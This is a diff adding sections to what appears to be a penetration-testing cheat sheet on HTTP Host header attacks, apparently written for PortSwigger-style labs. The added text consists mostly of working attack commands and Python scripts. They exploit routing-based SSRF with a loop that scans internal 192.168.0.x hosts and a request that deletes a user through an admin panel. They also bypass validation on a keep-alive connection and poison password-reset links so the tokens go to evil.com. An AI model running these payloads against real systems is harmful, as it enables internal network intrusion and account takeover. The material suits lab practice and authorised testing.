@@ -102,6 +102,100 @@ curl -sk "https://TARGET/" -H "Host: 127.0.0.1:6379" | head -20
 curl -sk "https://TARGET/" -H "Host: internal-api.local" | head -20
 ```
 
+### Routing-Based SSRF (Practitioner Critical)
+
+When the application uses the Host header for backend routing (common with reverse proxies and load balancers), you can route requests to arbitrary internal hosts:
+
+```bash
+# Route the request to an internal admin panel via Host header
+# The connection goes to TARGET's IP, but Host routes internally
+curl -sk "https://TARGET/" -H "Host: 192.168.0.1" --resolve TARGET:443:ACTUAL_IP
+# If you get different content → routing-based SSRF confirmed
+
+# Scan internal hosts via Host header
+for i in $(seq 1 254); do
+  result=$(curl -sk "https://TARGET/" -H "Host: 192.168.0.$i" -o /dev/null -w "%{http_code}:%{size_download}" 2>/dev/null)
+  if [ "$result" != "504:0" ] && [ "$result" != "000:0" ]; then
+    echo "192.168.0.$i → $result"
+  fi
+done
+
+# Access admin panel once found
+curl -sk "https://TARGET/admin" -H "Host: 192.168.0.FOUND_IP"
+curl -sk "https://TARGET/admin/delete?username=carlos" -H "Host: 192.168.0.FOUND_IP"
+```
+
+### Absolute URL + Host Mismatch
+
+Some servers parse the absolute URL in the request line separately from the Host header — exploit this disagreement:
+
+```bash
+# Use absolute URL in request line — server routes based on Host, 
+# but application logic uses the absolute URL
+# This requires a raw HTTP connection:
+printf 'GET https://TARGET/ HTTP/1.1\r\nHost: COLLABORATOR.oastify.com\r\n\r\n' | openssl s_client -connect TARGET:443 -quiet 2>/dev/null
+
+# Or use Python
+python3 -c "
+import socket, ssl
+ctx = ssl.create_default_context()
+ctx.check_hostname = False
+ctx.verify_mode = ssl.CERT_NONE
+sock = ctx.wrap_socket(socket.create_connection(('TARGET', 443)), server_hostname='TARGET')
+sock.send(b'GET https://TARGET/ HTTP/1.1\r\nHost: COLLABORATOR\r\nConnection: close\r\n\r\n')
+print(sock.recv(4096).decode())
+"
+```
+
+### Connection State Attack (Keep-Alive Poison)
+
+Send a legitimate first request with valid Host, then reuse the same connection for a second request with a malicious Host:
+
+```python
+#!/usr/bin/env python3
+"""Connection state attack: first request validates, second exploits."""
+import socket, ssl
+
+TARGET = "TARGET_HOST"
+INTERNAL = "192.168.0.1"
+
+ctx = ssl.create_default_context()
+ctx.check_hostname = False
+ctx.verify_mode = ssl.CERT_NONE
+sock = ctx.wrap_socket(socket.create_connection((TARGET, 443)), server_hostname=TARGET)
+
+# Request 1: Valid Host (passes validation, warms connection)
+req1 = f"GET / HTTP/1.1\r\nHost: {TARGET}\r\nConnection: keep-alive\r\n\r\n"
+sock.send(req1.encode())
+resp1 = sock.recv(65535)
+
+# Request 2: Malicious Host on SAME connection (may bypass validation)
+req2 = f"GET /admin HTTP/1.1\r\nHost: {INTERNAL}\r\nConnection: close\r\n\r\n"
+sock.send(req2.encode())
+resp2 = sock.recv(65535)
+print(resp2.decode(errors='replace')[:1000])
+sock.close()
+```
+
+### Dangling Markup in Password Reset
+
+When Host header injection is blocked but special characters in the Host value are not filtered:
+
+```bash
+# Inject via port field — some apps use Host including port for URL generation
+curl -sk "https://TARGET/forgot-password" -X POST \
+  -H "Host: TARGET:@evil.com" \
+  -d "email=victim@example.com"
+# Result: reset link becomes https://TARGET:@evil.com/reset?token=SECRET
+# Browser treats evil.com as the actual host (@ is userinfo separator)
+
+# Dangling markup via Host header (steal token from email HTML)
+curl -sk "https://TARGET/forgot-password" -X POST \
+  -H "Host: TARGET:'><a href='//evil.com/?" \
+  -d "email=victim@example.com"
+# If injected into email HTML, creates a link capturing subsequent content
+```
+
 ### Web Cache Poisoning + Host Header
 
 ```python
